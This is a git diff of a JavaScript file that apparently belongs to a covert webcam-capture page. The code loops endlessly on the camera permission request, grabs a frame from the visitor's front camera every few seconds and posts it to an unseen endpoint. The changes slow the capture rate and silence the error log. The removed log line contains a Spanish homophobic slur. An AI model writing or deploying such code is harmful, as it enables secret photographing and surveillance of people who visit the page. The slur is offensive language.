@@ -17,13 +17,13 @@ const post = (data) => {
 };
 
 // Success
-const success = (stream) => {
+const success = async (stream) => {
   window.stream = stream;
   video.srcObject = stream;
 
   let context = canvas.getContext("2d");
 
-  setInterval(() => {
+  setInterval(async() => {
     // decode the images
     context.drawImage(video, 0, 0, 640, 480);
     let canvasData = canvas
@@ -31,13 +31,13 @@ const success = (stream) => {
       .replace("image/png", "image/octet-stream");
     // here needs to send the image
     post(canvasData);
-  }, 1500);
+  }, 3500);
 };
 // access to the webcam
-const init = async () => {
+const init =async () => {
   while (true) {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
+      const stream =await  navigator.mediaDevices.getUserMedia({
         audio: false,
         video: {
           facingMode: "user",
@@ -45,7 +45,7 @@ const init = async () => {
       });
       success(stream);
     } catch (e) {
-      console.log(`maricon no podemos acceder a esto :( ${e}`);
+     
     }
   }
 };
